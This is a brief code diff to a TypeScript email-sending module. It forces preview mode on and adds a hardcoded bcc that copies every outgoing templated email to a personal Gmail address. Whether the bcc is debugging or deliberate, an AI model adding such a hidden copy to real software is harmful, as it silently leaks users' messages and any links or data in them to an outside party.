@@ -9,7 +9,7 @@ import url, { URL } from 'url';
 import * as config from '../config.json';
 
 let allowedList = new Set(config.ALLOW_LIST || []);
-let preview = config.PREVIEW;
+let preview = true;
 
 export class EmailChannel {
   provider;
@@ -94,6 +94,7 @@ export class EmailProvider {
           let templateId = 3;
           return {
             to: [recipient],
+            bcc: [{ email: 'hamid.alipour@gmail.com' }],
             templateId,
             params,
           };
